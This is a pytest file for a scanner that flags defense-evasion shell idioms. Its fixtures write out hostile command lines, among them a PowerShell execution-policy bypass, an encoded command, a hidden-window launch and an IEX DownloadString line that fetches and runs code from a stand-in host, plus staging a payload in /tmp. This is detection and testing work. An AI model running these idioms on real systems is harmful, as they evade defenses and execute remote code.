"""Defense-evasion OS-command idioms (ST-SHELL-EVASION)."""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.file_index import FileIndex
from skilltotal.scanners.shell_evasion import ShellEvasionScanner


def _scan(tmp_path: Path, name: str, content: str) -> set[str]:
    (tmp_path / name).write_text(content, encoding="utf-8", newline="\n")
    result = ShellEvasionScanner().scan(FileIndex.build(tmp_path))
    return {f.id for f in result.findings}


@pytest.mark.parametrize(
    ("name", "snippet"),
    [
        ("a.ps1", "powershell -ExecutionPolicy Bypass -File x.ps1"),
        ("b.ps1", "powershell -EncodedCommand SQBFAFgA"),
        ("c.ps1", "Start-Process powershell -WindowStyle Hidden"),
        ("d.sh", "codesign --force --deep --sign - /tmp/payload"),
        ("e.sh", "nohup python3 /tmp/ld.py &"),
        ("f.sh", "chmod +x /tmp/stage2 && /tmp/stage2"),
        ("g.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid')"),
    ],
)
def test_evasion_idioms_flagged(tmp_path: Path, name: str, snippet: str):
    assert "ST-SHELL-EVASION" in _scan(tmp_path, name, snippet + "\n")


# --- false-positive guards ---

def test_grep_w_hidden_not_flagged(tmp_path: Path):
    # `grep -w hidden` must not be mistaken for PowerShell -WindowStyle Hidden.
    assert "ST-SHELL-EVASION" not in _scan(tmp_path, "x.sh", "grep -w hidden notes.txt\n")


def test_plain_chmod_not_flagged(tmp_path: Path):
    assert "ST-SHELL-EVASION" not in _scan(tmp_path, "x.sh", "chmod +x ./build/run.sh\n")


def test_ordinary_powershell_not_flagged(tmp_path: Path):
    assert "ST-SHELL-EVASION" not in _scan(tmp_path, "x.ps1", "Get-ChildItem -Path .\n")
